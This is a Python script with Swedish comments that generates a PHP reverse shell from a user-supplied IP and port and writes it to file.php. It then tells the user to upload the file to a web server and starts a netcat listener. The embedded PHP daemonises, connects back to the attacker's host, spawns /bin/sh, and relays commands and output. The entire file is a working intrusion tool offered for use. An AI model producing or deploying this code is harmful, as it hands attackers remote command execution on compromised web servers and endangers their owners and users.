"""PHP Remoteshell Creator"""
import subprocess

def phpshell():
    """Skapar ett PHP remote shell och startar netcat med de angivna värderna."""
    # Frågar användaren efter värden för variablerna
    b_value = input("Ange värde för \$a (t.ex. 'IP): ")
    c_value = input("Ange värde för \$b (t.ex. 'PORT'): ")

    # PHP-koden med de användardefinierade värdena
    php_code = f"""<?php
set_time_limit(0);
$a = "1.0";
$b = '{b_value}';
$c = '{c_value}';
$d = 1400;
$e = null;
$f = null;
$g = 'uname -a; w; id; /bin/sh -i';
$h = 0;
$i = 0;

if (function_exists('pcntl_fork')) {{
    $j = pcntl_fork();
    if ($j == -1) {{
        printit("ERROR: Can't fork");
        exit(1);
    }}
    if ($j) {{
        exit(0);
    }}
    if (posix_setsid() == -1) {{
        printit("Error: Can't setsid()");
        exit(1);
    }}
    $h = 1;
}} else {{
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}}
chdir("/");
umask(0);

$k = fsockopen($b, $c, $l, $m, 30);
if (!$k) {{
    printit("$m ($l)");
    exit(1);
}}

$n = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$o = proc_open($g, $n, $p);
if (!is_resource($o)) {{
    printit("ERROR: Can't spawn shell");
    exit(1);
}}

stream_set_blocking($p[0], 0);
stream_set_blocking($p[1], 0);
stream_set_blocking($p[2], 0);
stream_set_blocking($k, 0);
printit("Successfully opened reverse shell to $b:$c");
while (1) {{
    if (feof($k)) {{
        printit("ERROR: Shell connection terminated");
        break;
    }}
    if (feof($p[1])) {{
        printit("ERROR: Shell process terminated");
        break;
    }}
    $q = array($k, $p[1], $p[2]);
    $r = stream_select($q, $e, $f, null);
    if (in_array($k, $q)) {{
        $s = fread($k, $d);
        fwrite($p[0], $s);
    }}
    if (in_array($p[1], $q)) {{
        $s = fread($p[1], $d);
        fwrite($k, $s);
    }}
    if (in_array($p[2], $q)) {{
        $s = fread($p[2], $d);
        fwrite($k, $s);
    }}
}}
fclose($k);
fclose($p[0]);
fclose($p[1]);
fclose($p[2]);
proc_close($o);

function printit($t) {{
    global $h;
    if (!$h) {{
        print "$t\\n";
    }}
}}
?>
"""

    # Skapar och skriver till filen
    with open("file.php", "w", encoding='utf-8') as file:
        file.write(php_code)

    print("PHP-filen 'file.php' har skapats med angivna värden. "
          "Ladda upp den på en webserver för att få remote shell.")
    command = ["nc", "-lvnp", c_value]
    print(f"Startar Netcat-lyssnare på port {c_value}...")
    subprocess.call(command)
if __name__ == "__main__":
    phpshell()
